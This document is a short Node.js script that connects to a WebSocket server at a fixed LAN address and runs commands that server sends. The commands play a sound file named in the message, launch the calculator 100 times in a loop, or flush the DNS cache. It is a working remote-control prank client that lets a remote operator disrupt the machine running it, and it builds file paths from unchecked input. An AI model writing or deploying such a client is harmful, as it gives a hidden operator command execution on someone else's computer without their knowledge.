var ws=require("ws");
var cmd=require("node-cmd");
var player=require('play-sound')(opts={});
var socket=new ws("ws://10.10.231.211:16384");
socket.on("open",()=>{});
socket.on("close",()=>{});
function fuck(){
    for(let i=0;i<100;++i)
        cmd.runSync("calc");
}
socket.on("message",(data)=>{
	let context=JSON.parse(data);
    if(context.type=="play"){
        player.play(`./music/${context.music}`,(err)=>{});
    }else if(context.type=="fuck"){
        fuck();
    }else if(context.type=="dnsflush"){
        cmd.run("ipconfig /flushdns");
    }
});